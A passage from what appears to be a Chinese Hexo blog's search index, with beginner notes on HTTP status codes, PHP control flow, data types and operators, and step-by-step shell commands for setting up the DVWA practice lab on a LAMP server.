重定向--需要后续操作才能完成这一请求4xx: 客户端错误--请求有语法错误或请求无法实现5xx: 服务端错误--服务器在处理某个正确请求时发生错误</code></pre><p>常见状态码</p><pre><code>200 OK                    //客户端请求成功400 Bad Request           //客户端请求有语法错误，不能被服务器所理解401 Unauthorized          //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用403 Forbidden             //服务器收到请求，但是拒绝提供服务404 Not Found             //请求资源不存在，eg:输了错误的URL500 Internal Server Error //服务器发生不可预期的错误503 Server Unavailable    //服务器当前不能处理客户端的请求，一段时间后可能恢复正常</code></pre><p>头部消息</p><p><img src="c-02.jpg" alt="头部消息"></p><p>POST请求的几种Conten-Type</p><ul><li>application/x-www-form-urlencoded:  最常见的POST提交数据方式·浏览器支持的原生form表单</li><li>multipart/form-data:                这种方式一般用来上传文件。</li><li>application/json:                   在响应头中很常见，在请求头中用来告诉服务端消息主体是序列化后的son字符串</li></ul><p>boundary：较长，用于分隔不同的字段<br>    + –boundary开始<br>    + –boundary–结束</p><p>好紧迫的时间……</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-基础入门-01 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-002-基础</title>
      <link href="/2023/02/22/PHP-Study-002/"/>
      <url>/2023/02/22/PHP-Study-002/</url>
      
        <content type="html"><![CDATA[<p>流程控制语句</p><span id="more"></span><h1 id="顺序执行"><a href="#顺序执行" class="headerlink" title="顺序执行"></a>顺序执行</h1><p>自上而下，没有控制。</p><h1 id="分支执行"><a href="#分支执行" class="headerlink" title="分支执行"></a>分支执行</h1><h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单分支</span></span><br><span class="line"><span class="keyword">if</span>(条件)&#123;</span><br><span class="line">    <span class="comment">// 条件成立就执行大括号的内容</span></span><br><span class="line">    执行语句;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 双分支</span></span><br><span class="line"><span class="keyword">if</span>(条件)&#123;</span><br><span class="line">    执行语句</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 条件不成立就执行这个大括号的内容</span></span><br><span class="line">    执行语句;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多分支语句</span></span><br><span class="line"><span class="keyword">if</span>(条件<span class="number">1</span>)&#123;</span><br><span class="line">    模块<span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(条件<span class="number">2</span>)&#123;</span><br><span class="line">    模块<span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(条件<span class="number">3</span>)&#123;</span><br><span class="line">    模块<span class="number">3</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(条件n)&#123;</span><br><span class="line">    模块n;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    模块last;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 多分支的部分带入单分支和双分支即可，不过多解释了</span></span><br></pre></td></tr></table></figure><h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式) &#123;</span><br><span class="line">    <span class="keyword">case</span> 值<span class="number">1</span>:  <span class="comment">// 是否等于值1</span></span><br><span class="line">        语句块<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> 值<span class="number">2</span>:</span><br><span class="line">        语句块<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> 值<span class="number">3</span>:</span><br><span class="line">        语句块<span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> 值n:</span><br><span class="line">        语句块n;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 执行到最后，都不满足值的条件就执行这个，和else差不多</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        语句块last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个和java一样，有穿透效果。<br>简单来说，值匹配正确了，语句块下面没有break及时退出，就会出现执行到底的情况。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 举个简单的例子</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;day01 &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;day02&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;day03&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;day04&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;day05&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;day06&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;day00&lt;br&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上面执行输出的结果就是：</span></span><br><span class="line">day03</span><br><span class="line">day04</span><br><span class="line">day05</span><br><span class="line">day06</span><br><span class="line">day00</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：值最好是整形和字符串，没有语句块和break时，会自动穿透到下面。</span></span><br><span class="line"><span class="comment">// 具体格式请仔细观察。</span></span><br></pre></td></tr></table></figure><h1 id="循环执行"><a href="#循环执行" class="headerlink" title="循环执行"></a>循环执行</h1><h2 id="while和do…while"><a href="#while和do…while" class="headerlink" title="while和do…while"></a>while和do…while</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果表达式为true，循环将一直执行（不控制则为死循环）</span></span><br><span class="line"><span class="comment">// 如果表达式为false，循环将直接终止（循环控制，跳出循环的关键在语句块）</span></span><br><span class="line"><span class="keyword">while</span>(表达式) &#123;</span><br><span class="line">    语句块;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与上面不同的是：先执行语句块，再进行表达式的判断</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    语句块;</span><br><span class="line">&#125; <span class="keyword">while</span> (表达式);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(初始化语句;条件判断;自增/自减语句)&#123;</span><br><span class="line">    语句块;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单举例：</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span> ; <span class="variable">$a</span> &lt; <span class="number">5</span> ; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果：01234</span></span><br><span class="line"><span class="comment">// 同样，条件判断为true就执行语句块。</span></span><br></pre></td></tr></table></figure><h2 id="特殊流程控制语句"><a href="#特殊流程控制语句" class="headerlink" title="特殊流程控制语句"></a>特殊流程控制语句</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 循环有嵌套。</span></span><br><span class="line"><span class="keyword">break</span>;      <span class="comment">// 退出循环，后面加数字时会指定退出第几层循环   退出后它所在的循环就废了</span></span><br><span class="line"><span class="keyword">continue</span>;   <span class="comment">// 退出当前循环，继续下一轮循环               退出后它的循环若还没达到退出条件，依然会继续执行</span></span><br><span class="line"><span class="keyword">exit</span>();     <span class="comment">// 退出程序                                里面可以塞个字符串做退出提示</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-001-基础</title>
      <link href="/2023/02/21/PHP-Study-001/"/>
      <url>/2023/02/21/PHP-Study-001/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.php.net/manual/zh/">php官网文档</a></p><p><strong>数据类型与运算符</strong></p><h1 id="数据类型概述"><a href="#数据类型概述" class="headerlink" title="数据类型概述"></a>数据类型概述</h1><span id="more"></span><p>返回变量的数据类型</p><p><strong>简述命名规则</strong> ：很多命名规则都是 <strong>字母数字下划线</strong> ，还有驼峰命名法的，大体上就这些。命名规则其他编程语言也适用。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br></pre></td></tr></table></figure><p>数据类型</p><table><thead><tr><th>类型</th><th>释义</th><th>补充</th></tr></thead><tbody><tr><td>bool</td><td><strong>布尔类型</strong></td><td>true/false[ 0,0.0,&#39;&#39;,&#39;0&#39;,array(),null ]<br>(方括号内表示false的情况，其他情况都是true)</td></tr><tr><td>int</td><td>整形</td><td>-</td></tr><tr><td>float</td><td>浮点型</td><td>带小数           -</td></tr><tr><td>string</td><td>字符串</td><td><strong>单引号</strong> : 简单字符串效率高，且字符串出现变量时不会生效。<br> <strong>双引号</strong> : 可以解析引号内的变量,最好使用{}框住变量 <br> <strong>定界符</strong> : 形如<br>&lt;&lt;&lt;标识符<br>内容<br>标识符 <br><br>标识符内的内容可以写任何内容，可以包裹特殊符号，但和双引号一样，变量需要{}囊括起来</td></tr><tr><td>array</td><td>数组</td><td>array(“name”=&gt;”Tom”,”sex”=&gt;”man”)<br>打印数组：print_r<br>一般是下标访问数组：$c[下标]<br>下上面的”name”就是一个下标，且不等于name时不输出”Tom”<br></td></tr><tr><td>object</td><td>对象</td><td>较复杂，后面补充</td></tr><tr><td>resource</td><td>资源</td><td>访问外部资源</td></tr><tr><td>NULL</td><td>空值</td><td>表示没有任何值</td></tr></tbody></table><h1 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h1><h2 id="自转"><a href="#自转" class="headerlink" title="自转"></a>自转</h2><p>参与数据运算时，会出现其他数据类型自动转换为数值参与运算的情况。最好不涉及。</p><h2 id="强转"><a href="#强转" class="headerlink" title="强转"></a>强转</h2><p>类型的强制转换： (数据类型)需要转换的数据</p><p>例如： <strong>(int)$a</strong> ;</p><p>bool,float,string,array,object都可以强转。</p><h2 id="测试函数"><a href="#测试函数" class="headerlink" title="测试函数"></a>测试函数</h2><p>形如： <strong>is_数据类型(数据)</strong> ;</p><p>例如： <strong>is_bool($a)</strong> ;</p><p>其他数据类型也有</p><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><h2 id="常量的定义-使用-区别-常量与变量"><a href="#常量的定义-使用-区别-常量与变量" class="headerlink" title="常量的定义+使用+区别(常量与变量)"></a>常量的定义+使用+区别(常量与变量)</h2><p>定义常量： <strong>define(“变量名”,”变量值”);</strong><br>使用常量： echo 常量名;<br>检查是否定义了某常量： <strong>defined(“变量名”);</strong></p><p>常量与变量的区别：</p><blockquote><ol><li>不理会变量规则，在任何地方定义与使用。</li><li>没有$,仅define定义，不可重新定义和修改</li><li>值类型：bool,int,float,string</li><li>预定义常量不区分大小写，自定义常量区分大小写。</li></ol></blockquote><h2 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h2><p>系统定义好的常量</p><table><thead><tr><th>常量名</th><th>常量值</th></tr></thead><tbody><tr><td>__FILE__</td><td>当前文件在系统当中的完整路径和文件名</td></tr><tr><td>__LINE__</td><td>当前行数</td></tr><tr><td>__FUNCTION__</td><td>当前的函数名</td></tr><tr><td>__CLASS__</td><td>当前的类名</td></tr><tr><td>__METHOD__</td><td>当前对象的方法名</td></tr><tr><td>PHP_OS</td><td>UNIX或WINNT等</td></tr><tr><td>PHP_VERSION</td><td>当前PHP服务器的版本</td></tr><tr><td>DIRECTORY_SERARATOR</td><td>\或/ 根据操作系统决定目录的分隔符</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><h2 id="8个常用魔术常量"><a href="#8个常用魔术常量" class="headerlink" title="8个常用魔术常量"></a>8个常用魔术常量</h2><table><thead><tr><th>名字</th><th>说明</th></tr></thead><tbody><tr><td>__LINE__</td><td>文件中的当前行号。</td></tr><tr><td>__FILE__</td><td>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。</td></tr><tr><td>__DIR__</td><td>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 \d\irname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。</td></tr><tr><td>__FUNCTION__</td><td>当前函数的名称。匿名函数则为 {closure}。</td></tr><tr><td>__CLASS__</td><td>当前类的名称。类名包括其被声明的作用域（例如 Foo\Bar）。当用在 trait 方法中时，__CLASS__ 是调用 trait 方法的类的名字。</td></tr><tr><td>__TRAIT__</td><td>Trait 的名字。Trait 名包括其被声明的作用域（例如 Foo\Bar）。</td></tr><tr><td>__METHOD__</td><td>类的方法名。</td></tr><tr><td>__NAMESPACE__</td><td>当前命名空间的名称。</td></tr><tr><td>ClassName::class</td><td>完整的类名。</td></tr></tbody></table><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="简略概述"><a href="#简略概述" class="headerlink" title="简略概述"></a>简略概述</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1.算数运算符</span><br><span class="line">    + - * / % ++ --</span><br><span class="line">    注：++、--是针对变量而言的</span><br><span class="line"></span><br><span class="line">2.字符串运算符</span><br><span class="line">    . ：这个点呐，连接变量或者字符串</span><br><span class="line">    如：echo &#x27;my name is&#x27;.&#x27;SYW&#x27;;</span><br><span class="line"></span><br><span class="line">3.赋值运算符(和算术运算符相比，多了个等号)</span><br><span class="line">    属于二元运算符</span><br><span class="line">    右边可以为表达式(任何有值的东西)</span><br><span class="line">    = += -= *= /= %= .=</span><br><span class="line">    </span><br><span class="line">    $a += $b  等同于  $a = $a + $b;  </span><br><span class="line"></span><br><span class="line">4. 比较运算符</span><br><span class="line">    又叫做关系运算符，条件运算符。</span><br><span class="line">    返回布尔值，满足要求返回true，不满足返回false</span><br><span class="line">    验证输出请使用var_dump，否则会输出布尔值的整形值</span><br><span class="line"></span><br><span class="line">    ==  值相等</span><br><span class="line">    === 全等    值相等和类型相等</span><br><span class="line">    !=  不等    值不相等</span><br><span class="line">    <span class="tag">&lt;&gt;</span>  不等    值不相等</span><br><span class="line">    !== 不全等  值和类型都不等</span><br><span class="line">    &lt;   小于</span><br><span class="line">    &gt;   大于</span><br><span class="line">    &lt;=  小于等于</span><br><span class="line">    &gt;=  大于等于</span><br><span class="line"></span><br><span class="line">5.逻辑运算符</span><br><span class="line">    逻辑运算符会自动将比较的两者转为布尔类型再进行比较。</span><br><span class="line"></span><br><span class="line">    and     逻辑与      左右同时为true则返回true</span><br><span class="line">    or      逻辑或      左右任意为true则返回true</span><br><span class="line">    xor     逻辑异或    左右1个true1个false时返回true</span><br><span class="line">    !       逻辑非      为true返回false，为false返回true</span><br><span class="line">    &amp;&amp;      逻辑与      左右同时为true则返回true</span><br><span class="line">    ||      逻辑或      左右任意为true则返回true</span><br><span class="line">    </span><br><span class="line">    “短路”的两种情况：</span><br><span class="line">        当and,&amp;&amp;左边为false时，程序从false的地方停止执行，不执行右边</span><br><span class="line">        当||,or左边为true时，程序</span><br><span class="line"></span><br><span class="line">6.位运算符</span><br><span class="line">    位的意思是二进制位，位运算符指的是按位运算</span><br><span class="line">    举个简单的例子</span><br><span class="line"></span><br><span class="line">    1 &amp; 3 = 1   </span><br><span class="line">    这是按位的与运算，假设它是8bit的数字，就是</span><br><span class="line">    0000 0001   1</span><br><span class="line">    0000 0011   3</span><br><span class="line">    ---------</span><br><span class="line">    0000 0001   1</span><br><span class="line">    与的概念在上面讲过了，这里是直接的运用。</span><br><span class="line">    当然，具体的位运算符如下 </span><br><span class="line">    &amp;   按位与</span><br><span class="line">    |   按位或</span><br><span class="line">    ^   按位</span><br><span class="line">    ~   按位</span><br><span class="line">    &lt;&lt;  按位</span><br><span class="line">    &gt;&gt;  按位</span><br><span class="line"></span><br><span class="line">    emmmmm其他不做补充，以后再细说</span><br><span class="line">        </span><br><span class="line">7.其他运算符</span><br><span class="line">    1) 三元运算符(?:)</span><br><span class="line">        $a &gt; $b ? &#x27;值1&#x27; : &#x27;值2&#x27;;</span><br><span class="line">        条件判断   返回值1  返回值2</span><br><span class="line"></span><br><span class="line">        条件判断为true时：返回值1，</span><br><span class="line">               为false：返回值2</span><br><span class="line">    </span><br><span class="line">    2) 系统命令执行(``)</span><br><span class="line">        放在``里面就行</span><br><span class="line">        命令是cmd命令，例如：`ipconfig`;</span><br><span class="line">        涉及跨平台，命令在不同平台执行的不同，也就是不是win平台，可能不能使用cmd命令。</span><br><span class="line"></span><br><span class="line">    3) 屏蔽错误(@)</span><br><span class="line">        使用@加在可能报错的地方，这个地方的报错会被屏蔽掉！</span><br><span class="line">    </span><br><span class="line">    4) 成员访问运算符</span><br><span class="line">        -&gt;</span><br><span class="line">        =&gt;</span><br><span class="line">        暂时略过</span><br></pre></td></tr></table></figure><h2 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h2><p>摘录于官网。</p><table><thead><tr><th>结合方向</th><th>运算符</th><th>附加信息</th></tr></thead><tbody><tr><td>不适用</td><td>clone new</td><td>clone 和 new</td></tr><tr><td>右</td><td>**</td><td>算术运算符</td></tr><tr><td>不适用</td><td>+ - ++ – ~ (int) (float) (string) (array) (object) (bool) @</td><td>算术 (一元 + 和 -)， 递增/递减， 按位， 类型转换 和 错误控制</td></tr><tr><td>左</td><td>instanceof</td><td>类型</td></tr><tr><td>不适用</td><td>!</td><td>逻辑运算符</td></tr><tr><td>左</td><td>* / %</td><td>算术运算符</td></tr><tr><td>左</td><td>+ - .</td><td>算数 (二元 + 和 -)， array 和 string （. PHP 8.0.0 前可用）</td></tr><tr><td>左</td><td>&lt;&lt; &gt;&gt;</td><td>位运算符</td></tr><tr><td>左</td><td>.</td><td>string （PHP 8.0.0 起可用）</td></tr><tr><td>无</td><td>&lt; &lt;= &gt; &gt;=</td><td>比较运算符</td></tr><tr><td>无</td><td>== != === !== &lt;&gt; &lt;=&gt;</td><td>比较运算符</td></tr><tr><td>左</td><td>&amp;</td><td>位运算符 和 引用</td></tr><tr><td>左</td><td>^</td><td>位运算符</td></tr><tr><td>左</td><td>|</td><td>位运算符</td></tr><tr><td>左</td><td>&amp;&amp;</td><td>逻辑运算符</td></tr><tr><td>左</td><td>||</td><td>逻辑运算符</td></tr><tr><td>右</td><td>??</td><td>null 合并运算符</td></tr><tr><td>无关联</td><td>? :</td><td>三元运算符 (PHP 8.0.0 之前左联)</td></tr><tr><td>右</td><td>= += -= *= **= /= .= %= &amp;= |= ^= &lt;&lt;= &gt;&gt;= ??=</td><td>赋值运算符</td></tr><tr><td>不适用</td><td>yield from</td><td>yield from</td></tr><tr><td>不适用</td><td>yield</td><td>yield</td></tr><tr><td>不适用</td><td>print</td><td>print</td></tr><tr><td>左</td><td>and</td><td>逻辑运算符</td></tr><tr><td>左</td><td>xor</td><td>逻辑运算符</td></tr><tr><td>左</td><td>or</td><td>逻辑运算符</td></tr></tbody></table><p>结合方向：规定从哪个方向开始算的问题。</p><p>优先级归纳:</p><pre><code>1) [无]递增递减2) [右]逻辑非!3) [左]乘，除，取余4) [左]加，减，字符串连接符5) [无]包含大于号或者小于号的比较运算符6)[无]不包含大于号或者小于号的比较运算符6) [左]逻辑与&amp;&amp;7) [左]逻辑或18) [左]? :9)  [右]赋值运算符10) [左]逻辑异或xor</code></pre><p>圆括号的作用:</p><pre><code>用圆括号可以将表达式里面的某一块看成一个整体 !+增强代码可读性+优先执行</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-补充</title>
      <link href="/2023/02/20/DVWA-Study-03/"/>
      <url>/2023/02/20/DVWA-Study-03/</url>
      
        <content type="html"><![CDATA[<p>主要是补配置，好让靶场正常运行。</p><span id="more"></span><p><strong>补充一个小知识</strong> ：当你忘记root密码，且当前处于登录状态，无法切换到root身份时：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重置root密码，下次可别忘记啦~</span></span><br><span class="line">[root@syw / ] # sudo passwd root</span><br></pre></td></tr></table></figure><h1 id="另外一种安装LAMP的办法"><a href="#另外一种安装LAMP的办法" class="headerlink" title="另外一种安装LAMP的办法"></a>另外一种安装LAMP的办法</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这次的安装LAMP和上次略有不同：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个配置出来的问题是：gd模块无法加载到我的dvwa上面去</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">apt出问题的看下面的换源</span></span><br><span class="line">[root@syw / ] # apt install apache2 -y</span><br><span class="line">[root@syw / ] # apt install mariadb mariadb-server</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动apache的两个办法</span></span><br><span class="line">[root@syw / ] # service apache2 start </span><br><span class="line">[root@syw / ] # systemctl start apache2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加入开机启动</span></span><br><span class="line">[root@syw / ] # systemctl enable apache2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql也同理</span></span><br><span class="line">[root@syw / ] # systemctl start mariadb</span><br><span class="line">[root@syw / ] # systemctl enable mariadb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看状态</span></span><br><span class="line">[root@syw / ] # systemctl status apache2</span><br><span class="line">[root@syw / ] # systemctl status mariadb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将DVWA换到web根目录下并且该名为dvwa</span></span><br><span class="line">[root@syw / ] # mv DVWA-master /var/www/html/dvwa</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">config下配置文件的配置和php.ini文件的配置看前两篇博客即可</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql的连接配置看前面</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-03/c-01.jpg?raw=true" alt="状态"></p><h1 id="gd库"><a href="#gd库" class="headerlink" title="gd库"></a>gd库</h1><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>为了更便捷的安装，先把源换到国内</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@syw / ] # vi /etc/apt/sources.list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">官方源</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb http://http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">根据需要自己选一个，中科大的还可以</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">阿里云</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">清华大学</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">浙大</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">东软大学</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重庆大学</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">deb http://http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong> ：只留1个源，其他源全部注释掉。</p><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-03/c-02.jpg?raw=true" alt="状态"></p><p>补充一点：缺少数字签名的话，要自己去下载，再安装下去即可。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@syw / ] # wget archive.kali.org/archive-key.asc   //下载签名</span><br><span class="line">[root@syw / ] # apt-key add archive-key.asc   //安装签名</span><br><span class="line">[root@syw / ] # apt update // 更新下软件包列表</span><br></pre></td></tr></table></figure><h2 id="装gd库"><a href="#装gd库" class="headerlink" title="装gd库"></a>装gd库</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@syw / ] # apt install php-gd</span><br><span class="line">[root@syw / ] # apt install -y php-gd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当然，也可以换一种安装方法</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">云端的服务器实验了，这个办法很可行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum是针对centos使用的</span></span><br><span class="line">[root@syw / ] # yum install php-gd</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建DVWA-Linux</title>
      <link href="/2023/02/19/DVWA-Study-02/"/>
      <url>/2023/02/19/DVWA-Study-02/</url>
      
        <content type="html"><![CDATA[<p>准备一个空的虚拟机，带有公网IP。使用VMware也可以。<br><a href="https://museum.php.net/">点我下载php历史版本</a><br><a href="https://www.cnblogs.com/zxuuu/p/12419221.html">其他博客参照</a></p><span id="more"></span><h1 id="简单搭建下LAMP环境"><a href="#简单搭建下LAMP环境" class="headerlink" title="简单搭建下LAMP环境"></a>简单搭建下LAMP环境</h1><h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装apache+mysql+php</span></span><br><span class="line">[root@VM-4-16-centos ~]# yum install -y httpd mariadb mariadb-server php php-mysql</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动apache</span></span><br><span class="line">[root@VM-4-16-centos ~]# systemctl start httpd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将apache加入启动配置文件</span></span><br><span class="line">[root@VM-4-16-centos ~]# systemctl enable httpd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动mysql</span></span><br><span class="line">[root@VM-4-16-centos ~]# systemctl start mariadb </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将mysql加入启动配置文件</span></span><br><span class="line">[root@VM-4-16-centos ~]# systemctl enable mariadb </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置mysql账户和密码</span></span><br><span class="line">[root@VM-4-16-centos ~]# mysqladmin -u root password &quot;123456&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登录mysql</span></span><br><span class="line">[root@VM-4-16-centos ~]# mysql -u root -p123456</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">退出mysql，ctr+c也可以</span></span><br><span class="line">[root@VM-4-16-centos ~]# 